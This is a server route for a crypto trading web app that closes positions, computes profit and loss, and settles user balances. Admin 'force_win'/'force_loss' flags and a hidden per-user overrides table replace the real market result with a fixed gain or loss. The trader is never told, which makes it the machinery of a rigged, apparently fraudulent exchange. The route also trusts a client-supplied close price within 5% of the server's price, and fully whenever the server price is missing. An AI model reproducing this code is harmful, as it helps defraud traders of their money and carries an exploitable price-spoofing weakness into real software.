import { createClient, createAdminClient } from "@/lib/supabase/server"
import { NextResponse, type NextRequest } from "next/server"

async function getLivePrice(baseAsset: string): Promise<number> {
  // Try Binance
  try {
    const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${baseAsset}USDT`, {
      cache: "no-store",
      signal: AbortSignal.timeout(5000),
    })
    if (res.ok) {
      const data = await res.json()
      const price = parseFloat(data.price)
      if (price > 0) return price
    }
  } catch { /* fallback */ }

  // Try our own API
  try {
    const { headers } = await import("next/headers")
    const headersList = await headers()
    const host = headersList.get("host") || "localhost:3000"
    const protocol = host.includes("localhost") ? "http" : "https"
    const res = await fetch(`${protocol}://${host}/api/prices`, {
      cache: "no-store",
      signal: AbortSignal.timeout(5000),
    })
    if (res.ok) {
      const data = await res.json()
      const coin = data.crypto?.find((c: { symbol: string }) => c.symbol === baseAsset)
      if (coin?.price > 0) return coin.price
    }
  } catch { /* all failed */ }

  return 0
}

export async function POST(request: NextRequest) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 })

  const adminSupabase = await createAdminClient()
  const body = await request.json()
  const { tradeId, outcome, closePrice: clientClosePrice } = body
  if (!tradeId) return NextResponse.json({ error: "Trade ID required" }, { status: 400 })

  let isAdmin = false
  if (outcome && ["normal", "force_win", "force_loss"].includes(outcome)) {
    const { data: profile } = await adminSupabase.from("profiles").select("role").eq("id", user.id).single()
    isAdmin = profile?.role === "admin" || profile?.role === "super_admin"
    if (!isAdmin) return NextResponse.json({ error: "Forbidden" }, { status: 403 })
  }

  // Get the open position. Admins can close any user's position; users can only close their own.
  let positionQuery = adminSupabase.from("trades").select("*").eq("id", tradeId).eq("status", "open")
  if (!isAdmin) positionQuery = positionQuery.eq("user_id", user.id)
  const { data: position } = await positionQuery.single()

  if (!position) return NextResponse.json({ error: "Open position not found" }, { status: 404 })

  const baseAsset = position.pair.split("/")[0]
  const quoteAsset = position.pair.split("/")[1] || "USDT"
  const serverPrice = await getLivePrice(baseAsset)

  // Prefer the live price the user actually saw on screen (passed as closePrice)
  // so a winning trade closed on an uptrend settles at the on-screen value rather
  // than a slightly stale server re-fetch. We still validate it server-side: the
  // client price is only trusted when it is within 5% of the server's live price
  // (guards against spoofed payloads). If the server has no price, we trust the
  // client value; if neither is available, we cannot close.
  const clientPrice = Number(clientClosePrice)
  const hasClient = Number.isFinite(clientPrice) && clientPrice > 0
  let currentPrice = serverPrice
  if (hasClient) {
    if (serverPrice > 0) {
      const deviation = Math.abs(clientPrice - serverPrice) / serverPrice
      currentPrice = deviation <= 0.05 ? clientPrice : serverPrice
    } else {
      currentPrice = clientPrice
    }
  }

  if (currentPrice <= 0) {
    return NextResponse.json({ error: "Could not fetch market price" }, { status: 500 })
  }

  const entryPrice = Number(position.price)
  const qty = Number(position.amount)
  const closeTotal = currentPrice * qty
  const fee = closeTotal * 0.001

  // Direction of the open position leg. A "buy" leg is LONG (profit when price rises),
  // a "sell" leg is SHORT (profit when price falls).
  const isShort = position.side === "sell"
  const priceDelta = isShort ? entryPrice - currentPrice : currentPrice - entryPrice

  // Check for admin trade overrides (forced win/loss)
  let pnl = priceDelta * qty - fee - Number(position.fee || 0)
  let pnlPercent = entryPrice > 0 ? (priceDelta / entryPrice) * 100 : 0

  // Look for active override for this user (pair-specific first, then global)
  const { data: overrides } = await adminSupabase
    .from("trade_overrides")
    .select("*")
    .eq("user_id", position.user_id)
    .eq("active", true)
    .order("created_at", { ascending: false })

  const override = overrides?.find((o: any) => o.pair === position.pair) ||
                   overrides?.find((o: any) => !o.pair) || null
  const forcedResult = outcome === "force_win" ? "win" : outcome === "force_loss" ? "loss" : override?.forced_result

  if (forcedResult === "win" || forcedResult === "loss") {
    const mult = Number(override?.multiplier) || 1
    const entryTotal = entryPrice * qty
    const forcedAmount = entryTotal * 0.05 * mult
    pnl = forcedResult === "win" ? Math.abs(forcedAmount) : -Math.abs(forcedAmount)
    pnlPercent = forcedResult === "win" ? Math.abs(5 * mult) : -Math.abs(5 * mult)
    if (override?.id) await adminSupabase.from("trade_overrides").update({ active: false, used_at: new Date().toISOString() }).eq("id", override.id).eq("active", true)
  }


  // Close the SINGLE existing position leg. We do NOT insert a second trade row —
  // that caused double logging in Trade History. The original leg keeps its
  // opening side and is stamped with the exit price and realized PnL.
  await adminSupabase.from("trades").update({
    status: "closed",
    close_price: currentPrice,
    closed_at: new Date().toISOString(),
    fee: Number(position.fee || 0) + fee,
    pnl,
  }).eq("id", tradeId)

  // Settle balances against the quote asset. For a LONG (buy) leg the base asset
  // was credited on open, so release it back; for a SHORT (sell) leg no base was held.
  if (!isShort) {
    const { data: bBal } = await adminSupabase
      .from("balances")
      .select("*")
      .eq("user_id", position.user_id)
      .eq("asset", baseAsset)
      .single()

    if (bBal) {
      await adminSupabase.from("balances").update({
        available: Math.max(0, bBal.available - qty),
        updated_at: new Date().toISOString(),
      }).eq("user_id", position.user_id).eq("asset", baseAsset)
    }
  }

  // Credit the quote asset with the returned margin plus realized PnL
  // (entry notional + pnl; pnl is already direction-aware and net of fees).
  const { data: qBal } = await adminSupabase
    .from("balances")
    .select("*")
    .eq("user_id", position.user_id)
    .eq("asset", quoteAsset)
    .single()

  const creditAmount = (entryPrice * qty) + pnl
  if (qBal) {
    await adminSupabase.from("balances").update({
      available: Math.max(0, qBal.available + creditAmount),
      updated_at: new Date().toISOString(),
    }).eq("user_id", position.user_id).eq("asset", quoteAsset)
  } else {
    await adminSupabase.from("balances").insert({
      user_id: position.user_id,
      asset: quoteAsset,
      available: Math.max(0, creditAmount),
      in_order: 0,
    })
  }

  return NextResponse.json({
    success: true,
    message: `Closed ${qty} ${baseAsset} @ $${currentPrice.toLocaleString()} | P&L: ${pnl >= 0 ? "+" : ""}$${pnl.toFixed(2)} (${pnlPercent >= 0 ? "+" : ""}${pnlPercent.toFixed(2)}%)`,
    pnl,
    closePrice: currentPrice,
  })
}
